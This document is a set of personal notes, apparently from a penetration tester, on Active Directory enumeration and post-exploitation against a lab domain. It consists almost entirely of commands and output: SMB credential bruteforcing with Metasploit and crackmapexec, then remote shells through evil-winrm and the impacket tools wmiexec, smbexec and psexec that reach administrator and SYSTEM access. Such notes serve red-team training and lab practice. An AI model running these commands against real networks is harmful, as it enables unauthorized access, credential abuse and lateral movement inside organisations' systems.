This is a collection of notes about active directory and (post)exploitation

# Enumeration

## Checking your rights for remote device

### SMB_Login (Metasploit)

	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
	smbuser => administrator
	msf6 auxiliary(scanner/smb/smb_login) > set smbpass Pass123!
	smbpass => Pass123!
	msf6 auxiliary(scanner/smb/smb_login) > set smbdomain valhalla.local
	smbdomain => valhalla.local
	msf6 auxiliary(scanner/smb/smb_login) > run
	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_login) > 
	
### Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb valhalla.local -u administrator -p Pass123!                                                                                   1 ⚙
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\administrator:Pass123! (Pwn3d!)


## Remote Code Execution

### Evil-WinRM

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙

	Evil-WinRM shell v3.2

	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

	Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

	Info: Establishing connection to remote endpoint

	*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd

	Path
	----
	C:\Users\Administrator\Documents


	*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
	valhalla\administrator
	*Evil-WinRM* PS C:\Users\Administrator\Documents> 


### Impacket

wmiexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] SMBv3.0 dialect used
	[!] Launching semi-interactive shell - Careful what you execute
	[!] Press help for extra shell commands
	C:\>whoami
	valhalla\administrator

smbexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[!] Launching semi-interactive shell - Careful what you execute
	C:\Windows\system32>whoami
	nt authority\system


psexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Requesting shares on 192.168.200.100.....
	[*] Found writable share ADMIN$
	[*] Uploading file SJmjamtF.exe
	[*] Opening SVCManager on 192.168.200.100.....
	[*] Creating service qeWU on 192.168.200.100.....
	[*] Starting service qeWU.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 6.3.9600]
	(c) 2013 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	nt authority\system
